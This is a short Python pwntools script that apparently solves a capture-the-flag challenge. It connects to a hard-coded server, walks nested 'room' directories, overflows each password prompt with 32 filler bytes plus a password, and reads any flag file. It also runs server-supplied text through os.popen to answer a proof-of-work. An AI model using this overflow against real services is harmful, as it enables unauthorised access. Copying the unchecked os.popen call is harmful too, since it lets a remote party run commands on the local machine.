#!/usr/bin/env python2
from pwn import *
import os
from time import sleep

context.terminal = "kitty -e sh -c".split()
context.log_level = "debug"
IP, PORT = "35.188.197.160", 1002
room = ["room0","room1"]
pwd = ""
count = 0

global io


def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

def brute(pwd):
    global count
    for i in room:
        count += 1
        print(count)
        sl("cd {}".format(pwd+i))
        pwd = ""
        if check_dir():
            check_flag()
            pwd = "../"
            continue
        sl("./key")
        key = re(6)
        sl("A"*32+"p4ssw0rd")
        reu("Authenticating ...\n")
        check_flag()
        brute(pwd)
        sl("exit")
        pwd = "../"

def check_dir():
    sl("ls")
    sl("echo AAAA")
    ls = reu("AAAA\n")
    if "room" not in ls:
        return True
    else:
        return False


def check_flag():
    sl("ls")
    sl("echo AAAA")
    ls = reu("AAAA\n")
    if "flag" in ls:
        sl("cat flag*") 
        io.interactive()
        pause()

while True:
    try:
        io = remote(IP, PORT)
        reu("of: ")
        hashcash = os.popen(rl())
        s(hashcash.read())

        reu("chars):\n")
        io.interactive()
        sl("sh")
        brute(pwd)
    except:
        io.close()